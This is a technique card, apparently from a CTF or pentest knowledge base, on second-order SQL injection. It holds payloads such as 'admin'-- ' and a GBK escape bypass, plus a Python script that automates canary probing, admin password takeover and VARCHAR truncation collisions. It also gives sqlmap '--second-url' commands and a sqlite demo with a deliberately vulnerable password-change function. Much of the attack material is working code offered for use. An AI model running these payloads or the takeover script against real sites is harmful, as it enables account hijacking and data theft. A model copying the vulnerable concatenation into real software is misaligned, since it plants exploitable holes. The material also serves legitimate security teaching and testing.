---
title: "SQL Injection - Second-Order / Stored"
category: web
subcategory: sqli
type: technique
tags: [sqli, sql-injection, second-order, stored-sqli, deferred, registration, password-reset, mysql-real-escape-string, addslashes, prepared-statements, sqlmap, burp, second-url]
difficulty: hard
summary: "The payload is safely escaped on INSERT, stored verbatim, then concatenated raw into a different query later -- the injection fires on a page you never touched."
when_to_use:
  - "Registration/profile/comment input is stored, and some later page re-queries by that stored value"
  - "Your `'` survives into the database (you see it rendered back as `'`, not `\\'`) but the insert page is not injectable"
  - "A username like `admin'-- ` registers successfully and something breaks on the password-change or profile page"
  - "Batch jobs, admin dashboards, export/report pages, or email templates read stored values into SQL"
tools: [sqlmap, burp]
---

## TL;DR

First order: input -> query -> boom, same request. Second order: input -> **escaped** insert -> database ->
later request reads the row -> **unescaped** concatenation -> boom. The insert looks safe in code review
and sqlmap on the insert endpoint finds nothing. The bug is at the *read* site, and the "user input"
there is the database, which the developer trusted.

## Recognise it

- You can store a raw `'` in a field. Check: register `o'brien`, then look at the profile page.
  If it renders `o'brien`, the quote is in the DB unescaped. If it renders `o\'brien`, the app double-escapes
  (also a bug, but a different one).
- Something downstream errors after you store a quote: a 500 on `/profile`, `/password`, `/export`,
  `/admin/users`, or a cron-generated report.
- The code uses prepared statements for the INSERT and string concatenation for the SELECT
  (common when the SELECT was written first or by a different person).
- `mysql_real_escape_string($_POST['u'])` on insert, then `"SELECT ... WHERE user='" . $row['username'] . "'"` on read.
- Classic CTF shape: a username field with a length cap, plus a `/changepass` endpoint that does
  `UPDATE users SET password='X' WHERE username='<the username from the session>'`.

## Theory

Escaping is **transport-layer**, not a property of the data. `mysql_real_escape_string` makes a string
safe for *one* concatenation into *one* query. Once the row is written, the stored bytes are the original
bytes (`admin'-- `), because the escaping backslash was consumed by the SQL parser, not stored.

Any later code that concatenates `$row['username']` is injecting attacker bytes.

### The canonical exploit: username `admin'-- `

```php
// signup.php  -- SAFE
$stmt = $pdo->prepare("INSERT INTO users(username,password) VALUES(?,?)");
$stmt->execute([$_POST['u'], password_hash($_POST['p'], PASSWORD_DEFAULT)]);

// changepass.php -- VULNERABLE
$u = $_SESSION['username'];                 // comes from the DB / session, "trusted"
$pdo->query("UPDATE users SET password='" . $newhash . "' WHERE username='" . $u . "'");
```

Register `admin'-- `. Log in as that user. Change your password. The UPDATE becomes:

```sql
UPDATE users SET password='<your hash>' WHERE username='admin'-- '
```

The `-- ` comments out the rest; the WHERE now matches the real `admin`. You have overwritten the
administrator's password. No data is read back, no error is shown, and no scanner sees it.

### Other second-order shapes

- **Stored `UNION`**: username `x' UNION SELECT flag,1,1 FROM secrets-- ` where a "who else is online"
  page does `SELECT a,b,c FROM users WHERE username='$u'`.
- **Stored subquery in an ORDER BY**: a saved "sort preference" column concatenated into `ORDER BY $pref`.
- **Stored value in a LIKE**: `%' OR '1'='1` in a saved search filter.
- **Log/audit table**: the app writes your User-Agent to `audit_log` with a prepared statement, and an
  admin dashboard does `SELECT * FROM audit_log WHERE ua='$ua'` when you click a row.
- **Email/report templates**: a nightly job builds `WHERE country='$stored_country'`.
- **Numeric fields stored as text**: `quantity` stored as a string, later concatenated into arithmetic.

### Charset-based single-order variant (related trap)

`addslashes()`/`mysql_real_escape_string()` under a multibyte charset like GBK/SJIS/Big5:
`0xbf27` becomes `0xbf5c27` after escaping, and `0xbf5c` is a single valid GBK character, freeing the `'`.
This is a first-order bug, but it shows up in the same "we escaped it" codebases.
Payload: `%bf%27 OR 1=1-- -`.

## Attack

1. **Map the write sites.** Every field you can store: username, display name, email, bio, address,
   comment, filename, tag, saved-search, User-Agent, Referer.
2. **Prove storage fidelity.** Store `a'b"c\d` in each. Fetch every page that renders it. Anything that
   comes back byte-identical is a candidate.
3. **Map the read sites.** Every page that behaves differently per stored value. Grep the source if you
   have it for `$row[`, `.username`, `user["name"]` inside a query string.
4. **Plant a canary that errors.** Store `'` alone. Walk every page. A 500 identifies the read site.
5. **Plant a canary that delays.** Store `x' AND SLEEP(5)-- ` (MySQL) / `x' AND pg_sleep(5)-- `.
   Whichever page hangs is the read site, even if errors are suppressed.
6. **Weaponise.** Usually `-- ` truncation (to hijack a WHERE) or a UNION/subquery (to read data).
   Remember the comment needs a trailing space or use `-- -`/`#`.
7. **Watch the length cap.** Usernames are often `VARCHAR(20)`. `admin'-- ` is 9 bytes; a UNION is not.
   Split the payload across two fields if two columns are concatenated into the same query.

### Truncation bonus

MySQL in non-strict mode silently truncates `VARCHAR(n)` overflow **and** ignores trailing spaces in
comparisons. Registering `admin           x` (admin + 11 spaces + x) in a `VARCHAR(16)` column stores
`admin          ` which `=` compares equal to `admin`. That is account takeover with no injection at all --
always test it alongside second-order SQLi.

## Code

```python
#!/usr/bin/env python3
"""Second-order SQLi hunter + exploiter.

Phase 1: store a set of canaries in every writable field, then crawl every readable page
         and report which page changed / errored / hung for which canary.
Phase 2: run the classic `admin'-- ` account-takeover chain.

Usage:
    python3 second_order.py http://127.0.0.1:8000
"""
from __future__ import annotations

import string
import sys
import time

import requests

CANARIES = {
    "quote":      "zz'zz",
    "dquote":     'zz"zz',
    "backslash":  "zz\\zz",
    "comment":    "zz'-- ",
    "sleep_my":   "zz' AND SLEEP(5)-- ",
    "sleep_pg":   "zz' AND pg_sleep(5)-- ",
    "union":      "zz' UNION SELECT 1,2,3-- ",
}

READ_PATHS = ["/", "/profile", "/account", "/dashboard", "/users", "/search", "/export", "/admin"]


def register(base: str, user: str, pw: str) -> requests.Session:
    s = requests.Session()
    s.post(f"{base}/register", data={"username": user, "password": pw}, timeout=10, allow_redirects=True)
    return s


def login(base: str, user: str, pw: str) -> requests.Session:
    s = requests.Session()
    s.post(f"{base}/login", data={"username": user, "password": pw}, timeout=10, allow_redirects=True)
    return s


def probe_read_sites(base: str, sess: requests.Session) -> None:
    """Fetch every candidate read path and flag errors / long latency."""
    for path in READ_PATHS:
        url = base + path
        t0 = time.perf_counter()
        try:
            r = sess.get(url, timeout=30)
        except requests.exceptions.ReadTimeout:
            print(f"    [!] {path}: TIMEOUT (time-based second-order confirmed)")
            continue
        except requests.RequestException as exc:
            print(f"    [ ] {path}: {exc}")
            continue
        dt = time.perf_counter() - t0
        flag = ""
        if r.status_code >= 500:
            flag = "HTTP 5xx -> read site"
        elif dt > 4.0:
            flag = f"slow {dt:.1f}s -> read site"
        elif any(w in r.text for w in ("SQL syntax", "SQLSTATE", "ORA-0", "unrecognized token")):
            flag = "SQL error text -> read site"
        if flag:
            print(f"    [!] {path}: {flag}")


def hunt(base: str) -> None:
    print("[*] phase 1: canary sweep")
    for name, payload in CANARIES.items():
        user = f"c{name}{int(time.time()) % 100000}"
        stored = payload.replace("zz", user)
        print(f"  [*] canary {name}: {stored!r}")
        register(base, stored, "Passw0rd!")
        sess = login(base, stored, "Passw0rd!")
        probe_read_sites(base, sess)


def takeover(base: str, victim: str = "admin", newpass: str = "Pwn3d!123") -> None:
    """Register `<victim>'-- ` then change 'our' password; the UPDATE hits the real victim row."""
    print(f"[*] phase 2: second-order takeover of {victim!r}")
    evil = f"{victim}'-- "
    register(base, evil, "Passw0rd!")
    sess = login(base, evil, "Passw0rd!")
    if "login" in sess.get(base + "/dashboard", timeout=10).url:
        print("    [-] could not log in as the evil username (registration may be filtered)")
        return
    sess.post(f"{base}/changepass", data={"password": newpass, "new_password": newpass}, timeout=10)
    check = login(base, victim, newpass)
    body = check.get(base + "/dashboard", timeout=10).text
    if victim in body or "admin" in body.lower():
        print(f"    [+] takeover OK -- log in as {victim}:{newpass}")
    else:
        print("    [-] takeover did not land; try `admin'#`, `admin'/*`, or a padded variant")


def truncation(base: str, victim: str = "admin", width: int = 16) -> None:
    """MySQL non-strict VARCHAR truncation: victim + spaces + junk collides with victim."""
    print("[*] phase 3: varchar truncation collision")
    pad = " " * max(1, width - len(victim)) + "x"
    evil = victim + pad
    register(base, evil, "Passw0rd!")
    s = login(base, victim + " " * (width - len(victim)), "Passw0rd!")
    if s.cookies:
        print(f"    [+] truncation collision candidate with {evil!r}")
    else:
        print("    [-] no truncation collision (strict mode / proper column width)")


def main() -> None:
    base = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000").rstrip("/")
    mode = sys.argv[2] if len(sys.argv) > 2 else "all"
    if mode in ("all", "hunt"):
        hunt(base)
    if mode in ("all", "takeover"):
        takeover(base)
    if mode in ("all", "trunc"):
        truncation(base)
    print("[*] done -- confirm any flagged read path by hand in Burp Repeater")


if __name__ == "__main__":
    main()
```

### Local model to test the idea against

```python
#!/usr/bin/env python3
"""Self-contained demo of a second-order SQLi, with a self-test assertion.

Run: python3 second_order_demo.py
"""
import sqlite3


def build_db() -> sqlite3.Connection:
    con = sqlite3.connect(":memory:")
    con.execute("CREATE TABLE users(username TEXT PRIMARY KEY, password TEXT)")
    con.execute("INSERT INTO users VALUES(?,?)", ("admin", "SUPER_SECRET_HASH"))
    con.commit()
    return con


def signup(con: sqlite3.Connection, user: str, pw: str) -> None:
    # SAFE: parameterised. The raw bytes of `user` land in the table.
    con.execute("INSERT INTO users(username,password) VALUES(?,?)", (user, pw))
    con.commit()


def changepass(con: sqlite3.Connection, session_user: str, newpw: str) -> None:
    # VULNERABLE: the username came from the DB, so the dev "trusted" it.
    sql = "UPDATE users SET password='%s' WHERE username='%s'" % (newpw, session_user)
    con.executescript(sql)
    con.commit()


def main() -> None:
    con = build_db()
    evil = "admin'-- "
    signup(con, evil, "mypw")
    changepass(con, evil, "PWNED")
    got = con.execute("SELECT password FROM users WHERE username='admin'").fetchone()[0]
    print(f"admin password is now: {got}")
    assert got == "PWNED", "second-order injection did not fire"
    print("[+] self-test passed: the admin row was overwritten via a stored payload")


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **`-- ` needs the trailing space in MySQL.** Web forms often trim trailing whitespace on submit.
  Use `-- -`, `#` (`%23`), or `/*` (MySQL tolerates an unterminated `/*` at end of statement in some versions;
  do not rely on it).
- **The username is HTML-escaped on display**, which makes it *look* escaped. Check the database view
  (an admin page, an export, a JSON API) rather than the HTML.
- **Two read sites, different quoting.** One may use `"` and one `'`. Store a payload that works in both:
  `x'"-- ` often errors on both and narrows it down.
- **The stored value is hashed/normalised** (lowercased, slugified, `preg_replace('/[^a-z0-9]/','')`).
  Then that field is dead -- move to the next one.
- **Email fields** are usually validated, but the *local part* of an RFC-ish email can hold quotes in
  many lax validators: `"a'b"@x.com`.
- **sqlmap can do this**: `--second-url` (or `--second-req`) tells it to fire the injection request and
  then read the oracle from a *different* URL. This is the single most under-used sqlmap flag.
- **Do not forget INSERT-time injection into a different table.** Some apps insert the escaped value
  into table A with a prepared statement and into table B with concatenation in the same request.
- **Idempotency.** Each canary registration burns a username. Use a timestamp suffix so reruns do not
  collide, and clean up if the scoreboard counts accounts.

## Tools

- `sqlmap -r insert.req --second-url 'http://t/profile' --level=5 --risk=3` -- inject here, read there.
- `sqlmap -r insert.req --second-req read.req` -- when the read needs its own headers/cookies.
- Burp: send the store request, then Repeater the read request; Burp Comparer for the diff.
- Source grep when available: `grep -rn "\$row\[" --include=*.php | grep -i "select\|update\|where"`.

## References

- PortSwigger Web Security Academy -- SQL injection: https://portswigger.net/web-security/sql-injection
- PayloadsAllTheThings -- SQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings
- sqlmap `--second-url` / `--second-req` documentation in the sqlmap wiki: https://github.com/sqlmapproject/sqlmap
